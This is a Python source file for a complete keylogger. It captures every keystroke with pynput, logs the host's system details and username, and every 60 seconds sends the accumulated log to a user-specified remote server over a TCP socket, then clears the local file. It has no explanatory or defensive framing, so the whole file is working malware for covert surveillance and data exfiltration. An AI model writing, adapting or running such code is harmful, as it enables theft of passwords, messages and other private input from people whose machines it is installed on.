from pynput import keyboard
import os
import logging
import time
import socket
import platform
import getpass
import threading
from queue import Queue

# Configuration
LOG_DIR = ""
LOG_FILE = os.path.join(LOG_DIR, "key_log.txt")
server_ip_add = input("Enter Your Server IP Address: ")
server_port = int(input("Enter server port: "))
SERVER_ADDRESS = (server_ip_add, server_port)
SEND_INTERVAL = 60  # seconds

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Queue to hold log data
log_queue = Queue()

# Function to capture keystrokes
def on_press(key):
    try:
        if key == keyboard.Key.space:
            log_queue.put(" ")
        elif key == keyboard.Key.enter:
            log_queue.put("\n")
        elif hasattr(key, 'char') and key.char is not None:
            log_queue.put(key.char)
        else:
            log_queue.put(f" {key} ")
    except AttributeError:
        log_queue.put(f" {key} ")

# Listener
listener = keyboard.Listener(on_press=on_press)

# Function to send logs to a remote server
def send_logs():
    while True:
        time.sleep(SEND_INTERVAL)  # Send logs every SEND_INTERVAL seconds
        try:
            with open(LOG_FILE, "r") as file:
                data = file.read()
            if data:
                # Send data to server
                with socket.create_connection(SERVER_ADDRESS, timeout=10) as sock:
                    sock.sendall(data.encode("utf-8"))
                # Clear log after sending
                with open(LOG_FILE, "w") as file:
                    file.write("")
        except (socket.error, socket.timeout) as e:
            logging.error(f"Error sending logs: {e}")
        except Exception as e:
            logging.error(f"Unexpected error: {e}")

# Function to write logs from the queue to the log file
def write_logs():
    while True:
        with open(LOG_FILE, "a") as file:
            while not log_queue.empty():
                log_entry = log_queue.get()
                file.write(log_entry)
                log_queue.task_done()

# Main function
def main():
    # Log system information
    logging.info(f"Platform: {platform.system()}")
    logging.info(f"Platform-release: {platform.release()}")
    logging.info(f"Platform-version: {platform.version()}")
    logging.info(f"Architecture: {platform.machine()}")
    logging.info(f"Hostname: {socket.gethostname()}")
    logging.info(f"IP Address: {socket.gethostbyname(socket.gethostname())}")
    logging.info(f"Processor: {platform.processor()}")
    logging.info(f"Username: {getpass.getuser()}")

    # Start keylogger listener
    listener.start()

    # Start sending logs in a separate thread
    log_thread = threading.Thread(target=send_logs, daemon=True)
    log_thread.start()

    # Start writing logs to file in a separate thread
    write_thread = threading.Thread(target=write_logs, daemon=True)
    write_thread.start()

    # Keep the main thread running
    listener.join()

if __name__ == "__main__":
    main()


